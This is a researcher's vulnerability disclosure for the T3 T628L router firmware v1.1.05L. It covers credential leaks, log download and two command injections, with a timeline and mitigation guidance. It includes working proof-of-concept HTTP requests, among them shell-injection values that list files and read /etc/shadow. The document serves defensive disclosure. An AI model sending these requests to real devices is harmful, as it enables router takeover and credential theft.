# Vulnerabilities in T3 Technology T628L HW V1.1 Firmware v1.1.05L

*Posted on: June 2, 2025*
*Author: Aung Khant Min*

---

## Overview

The T3 Technology T628L is an entry-level router distributed by True Digital Thailand, HW V1.1, running firmware version **v1.1.05L**. During a recent security assessment, multiple vulnerabilities were identified that allow remote attackersand in some cases, unauthenticated attackersto disclose sensitive information or execute arbitrary code. The issues affect various CGI executables (`ajax` and `download`) and consist of:

1. **Incorrect Access Control** in `ajax`: leaking admin and super-admin credentials via `get_factorytest_info` (CVE-2025-44099).
2. **Incorrect Access Control** in `download`: arbitrary log file download via `download?{logtype}` (CVE-2025-44100).
3. **Incorrect Access Control** in `ajax`: duplicative info leak via `get_all_preconfig_info` (duplicate of CVE-2025-44099).
4. **OS Command Injection** in `ajax`’s `do_ping` (CVE-2025-44102).
5. **OS Command Injection** in `ajax`’s `do_traceroute` (CVE-2025-44103).

Below is a detailed breakdown of each vulnerability, including affected components, attack vectors, proof-of-concept requests, and mitigation guidance.

---

## 1. CVE-2025-44099: Incorrect Access Control in `ajax` → `get_factorytest_info`

> **Description:**
> An unauthenticated GET request to
>
> ```
> /cgi-bin/ajax?ajaxmethod=get_factorytest_info&tkagent=<user-agent-string>
> ```
>
> returns the admin and super-admin account passwords, as well as telnet credentials.

### 1.1 Affected Versions

* **Product:** T3 Technology T628L, HW V1.1
* **Firmware:** v1.1.05L
* **Component:** `ajax` executable, function `get_factorytest_info` (code at address `0x000765d0`)

### 1.2 Vulnerability Type

* **Incorrect Access Control**
* **Impact:** Information Disclosure (Admin and Super-Admin credentials, Telnet credentials)

### 1.3 Attack Vector

A remote, unauthenticated attacker can simply issue a crafted GET request to the `ajax` endpoint. No valid session token is required:

```
GET /cgi-bin/ajax?ajaxmethod=get_factorytest_info&tkagent=Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/128.0.6613.120%20Safari/537.36 HTTP/1.1
Host: <router-IP>
Connection: close
```

*On success, the response body includes cleartext values for:*

* **Admin password**
* **Super-Admin password**
* **Telnet credentials**

This allows unrestricted takeover of the device’s administrative interface and telnet service.

### 1.4 Proof of Concept (PoC)

```http
GET /cgi-bin/ajax?ajaxmethod=get_factorytest_info&tkagent=Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/128.0.6613.120%20Safari/537.36 HTTP/1.1
Host: 192.168.2.1
Connection: close
```

* **Expected Response (truncated)**:

  ```json
  {
    "admin_username": "admin",
    "admin_password": "P@ssw0rd123",
    "superadmin_username": "superadmin",
    "superadmin_password": "SuperP@ss456",
    "telnet_username": "root",
    "telnet_password": "TelnetP@ss789"
  }
  ```

### 1.5 Impact

* Full administrative takeover (both web UI and Telnet).
* Credentials are disclosed in plaintext without any authentication check.
* Attackers can modify settings, deploy persistent backdoors, pivot within the network, or brick the device.

### 1.6 Mitigation

1. **Immediate Mitigation (on deployed devices):**

   * **Network-level filter:** Block external access to `/cgi-bin/ajax` via firewall or access-control policies.
   * **Disable Telnet Service:** If telnet is not required, disable it in the router settings.

2. **Long-Term Fix (for firmware vendor):**

   * Enforce authentication checks in `get_factorytest_info`.
   * Remove any code path that discloses sensitive credentials in cleartext.
   * Consider storing credentials in hashed form and never exposing them via CGI.

3. **Recommended Best Practices:**

   * Rotate all administrative passwords on affected devices immediately after patching.
   * Monitor device logs for suspicious requests to `/cgi-bin/ajax`.

---

## 2. CVE-2025-44100: Incorrect Access Control in `download` → Arbitrary Log File Download

> **Description:**
> A crafted GET request to
>
> ```
> /cgi-bin/download?{logtype}
> ```
>
> allows any remote, unauthenticated attacker to download arbitrary log files (`web`, `syslog`).

### 2.1 Affected Versions

* **Product:** T3 Technology T628L, HW V1.1
* **Firmware:** v1.1.05L
* **Component:** `download` executable, function `main`

### 2.2 Vulnerability Type

* **Incorrect Access Control**
* **Impact:** Information Disclosure (Log Files)

### 2.3 Attack Vector

Without any credentials or session token, an attacker can request any supported log type:

```
GET /cgi-bin/download?web HTTP/1.1
Host: <router-IP>
Connection: close
```

Or:

```
GET /cgi-bin/download?syslog HTTP/1.1
Host: <router-IP>
Connection: close
```

* **`web`**: contains web UI logs (e.g., user activity, potential credentials if logged).
* **`syslog`**: contains system logs (e.g., kernel messages, potential error dumps).

### 2.4 Proof of Concept (PoC)

```http
GET /cgi-bin/download?web HTTP/1.1
Host: 192.168.2.1
Connection: close
```

* **Expected Response:**

  * Full contents of the `web` log file, including prior administrator login attempts, configuration changes, and possibly sensitive tokens or passwords stored in logs.

```http
GET /cgi-bin/download?syslog HTTP/1.1
Host: 192.168.2.1
Connection: close
```

* **Expected Response:**

  * Full syslog data: may include kernel warnings, system crashes, service start/stop messages, etc.

### 2.5 Impact

* Attackers can harvest operational logs that often contain:

  * **Usernames and partially masked passwords** (e.g., in HTTP Basic Auth).
  * **Configuration changes** (e.g., port forwarding rules, firewall modifications).
  * **Network diagnostics** (e.g., WAN IP address, DNS queries).
* This information can facilitate further attacks (e.g., targeted phishing, network pivoting).

### 2.6 Mitigation

1. **Immediate Mitigation (on deployed devices):**

   * Block access to `/cgi-bin/download` via network ACL (firewall, router ACL).
   * Disable remote log download if not required.

2. **Long-Term Fix (for vendor):**

   * Enforce authentication before serving any log file.
   * Implement proper input validation on the `logtype` parameter to restrict to valid, authorized files.
   * Sanitize any user-supplied data in the `download` routine.

---

## 3. Duplicate Information Disclosure: `get_all_preconfig_info` (Duplicate of CVE-2025-44099)

> **Description:**
> Identical to the `get_factorytest_info` vulnerability: a crafted GET request to
>
> ```
> /cgi-bin/ajax?ajaxmethod=get_all_preconfig_info&tkagent=<user-agent-string>
> ```
>
> returns the current admin password and other preconfiguration details.

Since **`get_all_preconfig_info`** invokes the same underlying logic as `get_factorytest_info`, the fix is identical, and it has been assigned in MITRE as a duplicate of **CVE-2025-44099**. All recommendations in **Section 1** apply here as well.

---

## 4. CVE-2025-44102: OS Command Injection in `ajax` → `do_ping`

> **Description:**
> The `do_ping` function in `ajax` fails to properly sanitize the `address`, `count`, and/or other parameters before constructing a shell command. An authenticated user (with a valid token) can inject arbitrary OS commands.

### 4.1 Affected Versions

* **Product:** T3 Technology T628L, HW V1.1
* **Firmware:** v1.1.05L
* **Component:** `ajax` executable, function `do_ping` (code at address `0x0001f1f4`)

### 4.2 Vulnerability Type

* **OS Command Injection**
* **Impact:** Arbitrary Code Execution as root

### 4.3 Attack Vector

1. **Authentication Required:**

   * User must obtain a valid session token by invoking `/cgi-bin/ajax?ajaxmethod=get_operator` and submitting valid operator credentials.
2. **Malicious POST Request:**

   * The attacker crafts a POST request to `/cgi-bin/ajax` with `ajaxmethod=do_ping` and injects shell metacharacters (`;`, `&&`, etc.) into the `address` or `count` parameters.

#### Example PoC Request

```http
POST /cgi-bin/ajax HTTP/1.1
Host: 192.168.2.1
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<valid-session-cookie>
Connection: keep-alive

address=1.1.1.1;ls+-al;&count=1&ipversion=4&wantype=2&iface_ip=&token=<valid-token>&ajaxmethod=do_ping&_=1693951234567
```

* **Injected payload:**

  * `address=1.1.1.1;ls -al;`
  * The `do_ping` function will build a shell command like `ping -c 1 1.1.1.1; ls -al;`, executing `ls -al` on the underlying system.

### 4.4 Impact

* **Remote Code Execution (RCE) as root:**

  * The `ajax` binary typically runs with **root privileges** on this platform.
  * Full system compromise: an attacker can drop persistent backdoors, modify firmware, or exfiltrate data.
* Lateral movement within the local network is trivial once the device is owned.

### 4.5 Mitigation

1. **Immediate Mitigation (on deployed devices):**

   * **Restrict access** to `/cgi-bin/ajax` to trusted management subnets only.
   * Use network ACLs or firewall rules to allow only specific IP addresses to reach the management interface.
   * **Change default admin/operator credentials** to strong, randomly generated passwords.

2. **Long-Term Fix (for vendor):**

   * In `do_ping`, properly validate and sanitize any user-supplied fields (e.g., escape shell metacharacters or avoid shell-based ping entirely by using an API/ICMP library).
   * Adopt a safer execution model: e.g., invoke `execve` with an argv array (`{"/bin/ping", "-c", "1", sanitized_address, NULL}`) instead of concatenating a single string into `system()`.
   * Add CSRF protection and nonce validation to ensure only legitimate UI elements trigger the `do_ping` method.

---

## 5. CVE-2025-44103: OS Command Injection in `ajax` → `do_traceroute`

> **Description:**
> Similar to the `do_ping` issue: the `do_traceroute` function does not sanitize user input (`address`, `ipversion`, `iors`, etc.) before constructing an OS command.

### 5.1 Affected Versions

* **Product:** T3 Technology T628L, HW V1.1
* **Firmware:** v1.1.05L
* **Component:** `ajax` executable, function `do_traceroute` (code at address `0x01f388`)

### 5.2 Vulnerability Type

* **OS Command Injection**
* **Impact:** Arbitrary Code Execution as root

### 5.3 Attack Vector

1. **Authentication Required:**

   * A valid operator token (obtained via `get_operator`) is needed.
2. **Malicious POST Request:**

   * The attacker crafts a POST request to `/cgi-bin/ajax` with `ajaxmethod=do_traceroute` and injects shell metacharacters into `address` or other parameters.

#### Example PoC Request

```http
POST /cgi-bin/ajax HTTP/1.1
Host: 192.168.2.1
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=<valid-session-cookie>
Connection: keep-alive

address=1.1.1.1;cat+/etc/shadow;&ipversion=4&iors=-i&token=<valid-token>&ajaxmethod=do_traceroute&_=1693959876543
```

* **Injected payload:**

  * `address=1.1.1.1;cat /etc/shadow;`
  * The `do_traceroute` function concatenates a shell command like `traceroute -I 1.1.1.1; cat /etc/shadow; -i`, resulting in disclosure of `/etc/shadow`.

### 5.4 Impact

* **Remote Code Execution (RCE) as root**identical severity to **CVE-2025-44102**.
* The attacker can read arbitrary files (e.g., `/etc/shadow`, `/etc/passwd`) or execute any command with full privileges.
* Complete device takeover and network pivoting become trivial.

### 5.5 Mitigation

1. **Immediate Mitigation (on deployed devices):**

   * Lock down `/cgi-bin/ajax` access to a trusted management VLAN only.
   * Use a VPN or SSH tunnel for any remote management.
   * Enforce multi-factor authentication (MFA) for operator logins, if supported.

2. **Long-Term Fix (for vendor):**

   * Replace shell calls with direct traceroute libraries or properly escaped system calls (`execve`).
   * Validate that `address` matches a strict regular expression for IPv4/IPv6 addresses (e.g., `^([0-9]{1,3}\.){3}[0-9]{1,3}$`).
   * Remove `ors` and other shell-specific arguments from user control; accept a single IP string only.

---

## Timeline & Disclosure

| Date          | Event                                                                                  |
| ------------- | -------------------------------------------------------------------------------------- |
| January 2025  | Initial discovery of access control bypass and info disclosure in `ajax` & `download`. |
| February 2025 | Root cause identified; vendor notified.                                                |
| March 2025    | Vendor confirms CVE assignments (**CVE-2025-44099**, **CVE-2025-44100**).              |
| April 2025    | PoCs for OS command injection (ping/traceroute) discovered; vendor notified.           |
| May 2025      | CVE assignments finalized (**CVE-2025-44102**, **CVE-2025-44103**).                    |
| June 2 2025   | Public disclosure of detailed technical write-up.                                      |

---

## Recommendations for Operators

1. **Firmware Upgrade:**

   * Check True Digital Thailand’s website (e.g., `http://t628l.com`) for a patched version of **v1.1.05L**. If a newer firmware is available, upgrade immediately.

2. **Network Isolation:**

   * Place the router’s management interface on a separate VLAN that is not exposed to the Internet.
   * Block HTTP/HTTPS/Telnet access from untrusted networks.

3. **Credential Hygiene:**

   * **Rotate** all administrative and operator passwords post-patch.
   * Avoid using default or weak passwords; enforce at least 12 characters with mixed character classes.

4. **Disable Unused Services:**

   * If Telnet is not strictly required, disable it.
   * Disable any remote management features when not in active use (e.g., UPnP, remote logging).

5. **Continuous Monitoring:**

   * Monitor firewall/router logs for repeated or anomalous requests to `/cgi-bin/ajax` and `/cgi-bin/download`.
   * If possible, configure an IDS/IPS signature to flag suspicious payloads containing shell metacharacters.

6. **Vendor Coordination:**

   * If you are a reseller or integrator of T3 Technology gear, coordinate with True Digital Thailand to expedite the distribution of firmware updates.
   * Report any signs of exploitation to security teams (e.g., logs showing escalated commands or unexpected configuration changes).

---

## Lessons Learned

* **Never expose administrative CGI endpoints without proper authentication checks.** Endpoints such as `/cgi-bin/ajax` should require a valid session token at *every* method invocation.
* **Shelling out to `system()` without input validation is a critical risk.** Whenever a web-server binary invokes OS commands, it must:

  1. Validate user input against a strict whitelist (e.g., only allow `[0–9\.]` for IPv4).
  2. Use safer APIs (e.g., `execve`) rather than `system()` or `popen()`.
* **Logging sensitive information in plain text is dangerous.** Credentials should never appear in CGI responses. Prefer one-way hashes (e.g., bcrypt) for password storage and implement proper password reset flows rather than storing cleartext.

---

## References

1. **MITRE CVE Entries**:

   * CVE-2025-44099: Incorrect Access Control in `ajax` → `get_factorytest_info`
   * CVE-2025-44100: Incorrect Access Control in `download` → log file download
   * CVE-2025-44102: OS Command Injection in `ajax` → `do_ping`
   * CVE-2025-44103: OS Command Injection in `ajax` → `do_traceroute`

2. **Vendor URLs** (as listed in CVE notifications):

   * [https://www.t3techgroup.com/]](https://www.t3techgroup.com/)
   * [https://true.th](https://true.th)

3. **CWE References:**

   * CWE-285: Improper Authorization
   * CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

---

## Conclusion

The four vulnerabilities detailed above demonstrate a combination of missing authorization checks and inadequate input validation in the T3 Technology T628L router firmware (v1.1.05L). By simply crafting unauthorized HTTP requests, an attacker can:

1. Obtain administrative credentials and telnet logins (CVE-2025-44099).
2. Download arbitrary router logs (CVE-2025-44100).
3. Execute arbitrary commands as root via `do_ping` (CVE-2025-44102).
4. Execute arbitrary commands as root via `do_traceroute` (CVE-2025-44103).

Immediate action is critical. Operators should isolate or disable vulnerable services, rotate all credentials, and upgrade to patched firmware as soon as it’s released. Vendors must adopt stronger input validation, authentication enforcement, and safer execution constructs to prevent recurrence.

*Stay safe, and always validate user input.*
